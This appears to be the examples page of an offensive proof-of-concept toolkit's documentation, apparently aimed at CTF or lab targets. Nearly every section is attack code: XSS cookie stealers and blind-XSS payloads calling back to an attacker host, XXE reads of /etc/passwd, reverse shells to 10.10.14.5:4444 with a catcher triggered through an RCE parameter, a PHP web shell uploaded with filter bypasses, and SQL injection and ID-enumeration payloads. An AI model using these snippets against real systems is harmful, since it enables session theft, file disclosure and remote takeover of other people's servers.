Examples
========

Common POC patterns and code snippets.

Colored Output
--------------

Use colored output for better visibility instead of ``print()``:

.. code-block:: python

   from your_project.utils.output import out

   out.success("Target is vulnerable!")       # [+] Green
   out.error("Connection failed")             # [-] Red
   out.info("Starting exploit")               # [*] Blue
   out.warning("Using default credentials")   # [!] Yellow
   out.debug(f"Response: {response.text}")    # [DEBUG] Magenta
   out.status("Extracting data...")           # [...] Cyan
   out.raw("No prefix")                       # No prefix, no color

Cookie Handling
---------------

Parse and use stolen cookies:

.. code-block:: python

   from your_project.utils.cookie import parse_cookie_string
   from your_project.utils.server_hooks import get_cookie
   import requests

   # Wait for XSS to steal cookie
   cookie_str = get_cookie(timeout=30)
   # Returns: "session=abc123; token=xyz789"

   # Parse for use with requests
   cookies = parse_cookie_string(cookie_str)
   # Returns: {'session': 'abc123', 'token': 'xyz789'}

   # Use in request
   response = requests.get(target_url, cookies=cookies)

XSS Payloads
------------

Generate XSS payloads with automatic callbacks:

.. code-block:: python

   from your_project.utils.xss import img_onerror, blind_xss, cookie_stealer, polyglot

   # Quick test payload
   payload = img_onerror(f"http://{lhost}:8000")

   # Cookie stealer with base64 encoding
   payload = cookie_stealer(f"http://{lhost}:8000")

   # Blind XSS with full context exfil
   payload = blind_xss(f"http://{lhost}:8000", identifier="admin_panel")

   # Polyglot (works in multiple contexts)
   payload = polyglot(f"http://{lhost}:8000")

   # Context-specific
   from your_project.utils.xss import context_specific
   payload = context_specific(f"http://{lhost}:8000", context="attribute")
   # Contexts: html, attribute, js, css

XXE Exploitation
----------------

Generate XXE payloads for file reading and SSRF:

.. code-block:: python

   from your_project.utils.xxe import quick_test, basic_file_read, php_filter_b64

   # Quick test (creates DTD + payload)
   payload = quick_test(f"http://{lhost}:8000", "/etc/passwd")
   # Writes DTD to payloads/xxe/xxe.dtd

   # Basic file read (in-response)
   payload = basic_file_read("/etc/passwd")

   # PHP source via filter
   payload = php_filter_b64("/var/www/html/config.php")

   # Format-specific
   from your_project.utils.xxe import svg_xxe, soap_xxe
   svg_payload = svg_xxe(f"http://{lhost}:8000", "/etc/passwd")

   # Get exfiltrated data
   from your_project.utils.server_hooks import get_exfil
   data = get_exfil(timeout=30)

Reverse Shells
--------------

Generate shells dynamically:

.. code-block:: python

   from your_project.utils.reverse_shells import bash_shell, python_oneliner, quick_bash

   # Generate shell files
   path = bash_shell("10.10.14.5", 4444)
   # Creates: payloads/shells/rev_bash.sh
   # Serve at: http://10.10.14.5:8000/shells/rev_bash.sh

   # Get one-liner for direct RCE
   cmd = python_oneliner("10.10.14.5", 4444)
   # Use in: os.system(cmd) or RCE vulnerability

   # Quick helper with download instructions
   quick_bash(lhost, 4444)  # Prints curl/wget commands

Shell Catcher
-------------

Catch reverse shells directly in Python (no netcat needed):

.. code-block:: python

   from your_project.utils.shell_catcher import ShellCatcher, auto_shell, quick_catch

   # Method 1: Full control
   catcher = ShellCatcher(4444)
   catcher.start()
   trigger_exploit()
   if catcher.wait_for_shell(timeout=30):
       catcher.stabilize()  # Upgrade to PTY
       catcher.interact()   # Interactive shell!

   # Method 2: Context manager (recommended)
   with auto_shell(4444) as catcher:
       trigger_exploit()
       if catcher.shell_caught:
           catcher.stabilize()
           catcher.interact()

   # Method 3: With trigger function
   def trigger():
       requests.get(f"http://target/rce?cmd={python_oneliner(lhost, 4444)}")

   quick_catch(4444, trigger_func=trigger)

File Upload
-----------

Upload files with bypass techniques:

.. code-block:: python

   from your_project.utils.file_upload import FileUploader, quick_upload

   # Full control
   uploader = FileUploader("http://target/upload")
   result = uploader.upload_with_bypass(
       "shell.php",
       b"<?php system($_GET['cmd']); ?>",
       techniques=["null_byte", "double_extension", "case_variation"]
   )

   # Simple upload
   result = uploader.upload("shell.php", php_code)

   # One-liner
   quick_upload("http://target/upload", "shell.php", php_code)

Available bypass techniques:

* ``null_byte``: filename.php%00.jpg
* ``double_extension``: filename.jpg.php
* ``case_variation``: filename.PHP
* ``mime_mismatch``: Send PHP as image/jpeg

Batch Requests
--------------

Intruder-style fuzzing with concurrency:

.. code-block:: python

   import httpx
   from your_project.utils.batch_request import (
       batch_request_sync,
       generate_param_payloads,
       generate_json_payloads
   )

   # Build base request
   client = httpx.Client()
   base = client.build_request(
       "POST",
       "http://target/api/login",
       json={"username": "test", "password": "test"}
   )

   # Test SQL injection
   sqli = ["' OR '1'='1", "admin'--", "' UNION SELECT NULL--"]
   results = batch_request_sync(
       base,
       payloads=generate_json_payloads("username", sqli),
       validate=lambda r: "dashboard" in r.text,
       concurrency=5,
       proxy="http://127.0.0.1:8080"
   )

   # Find successful payloads
   for r in results:
       if r.matched:
           out.success(f"Valid: {r.payload}")

   # Enumerate IDs
   results = batch_request_sync(
       client.build_request("GET", "http://target/api/user"),
       payloads=generate_param_payloads("id", range(1, 1000)),
       validate=lambda r: r.status_code == 200,
       concurrency=50
   )

Apache Hooks
------------

Read callbacks from Apache logs instead of built-in server:

.. code-block:: python

   from your_project.utils.apache_hooks import get_cookie, get_exfil, get_param

   # Get cookie from Apache logs
   cookie = get_cookie('/var/log/apache2/access.log', timeout=30)
   # Auto-decodes base64, returns most recent

   # Get exfiltrated data
   data = get_exfil('/var/log/apache2/access.log', timeout=30)

   # Get custom parameter
   value = get_param('data', '/var/log/apache2/access.log', timeout=30)

   # Watch in real-time
   from your_project.utils.apache_hooks import watch_log
   watch_log('/var/log/apache2/access.log', params=['cookies', 'exfil'])

CLI watch mode:

.. code-block:: bash

   uv run python -m your_project.utils.apache_hooks watch
   uv run python -m your_project.utils.apache_hooks watch /var/log/apache2/access.log cookies exfil

Network Utilities
-----------------

Get network interfaces and callback IPs:

.. code-block:: python

   from your_project.utils.network import get_interfaces, get_callback_host

   # Get all interfaces
   interfaces = get_interfaces()
   # {'eth0': '10.10.14.5', 'tun0': '10.10.16.2', ...}

   # Get best callback IP (prioritizes VPN)
   lhost = get_callback_host()
   # Returns: '10.10.16.2' (or best available)

Encoding Utilities
------------------

Common encoding operations:

.. code-block:: python

   from your_project.utils.encoding import (
       b64_encode, b64_decode,
       url_encode, url_decode,
       to_hex, from_hex,
       html_encode, html_decode
   )

   # Base64
   encoded = b64_encode("admin:password")
   decoded = b64_decode("YWRtaW46cGFzc3dvcmQ=")

   # URL
   safe = url_encode("../../etc/passwd")
   unsafe = url_decode("%2e%2e%2f")

   # Hex
   hex_str = to_hex("ABCD")      # "41424344"
   text = from_hex("41424344")    # "ABCD"

HTML Parsing
------------

Easy BeautifulSoup wrapper:

.. code-block:: python

   from your_project.utils.html_parser import HTMLParser, quick_parse, parse_response

   # Parse response
   parser = HTMLParser.from_response(response)

   # Find elements
   form = parser.find_by_id("login-form")
   inputs = parser.find_all_by_class("form-input")
   links = parser.find_links()

   # CSRF tokens
   csrf = parser.find_csrf_token()
   all_tokens = parser.find_all_csrf_tokens()

   # Forms
   forms = parser.find_forms()
   for form in forms:
       data = parser.extract_form_data(form)
       print(f"Action: {form.get('action')}, Data: {data}")

   # CSS selectors
   hidden = parser.css_select("input[type='hidden']")

   # Dump helpers
   parser.dump_forms()
   parser.dump_links()

Timing Attacks
--------------

For blind time-based exploitation:

.. code-block:: python

   from your_project.utils.timing import time_request

   def attempt(payload):
       return requests.get(f"http://target?id={payload}")

   duration = time_request(attempt, "1' AND SLEEP(5)--")
   if duration > 5:
       out.success("Vulnerable to time-based SQLi!")

Zip Utilities
-------------

Create and extract zip files:

.. code-block:: python

   from your_project.utils.zip_util import quick_zip, zip_multiple, extract_zip

   # Quick zip
   quick_zip("payloads/", output="payloads.zip")

   # Zip multiple files
   zip_multiple(
       ["exploit.py", "shell.php", "config.json"],
       output_path="poc.zip"
   )

   # Extract safely (prevents zip slip)
   extract_zip("archive.zip", extract_to="./extracted")
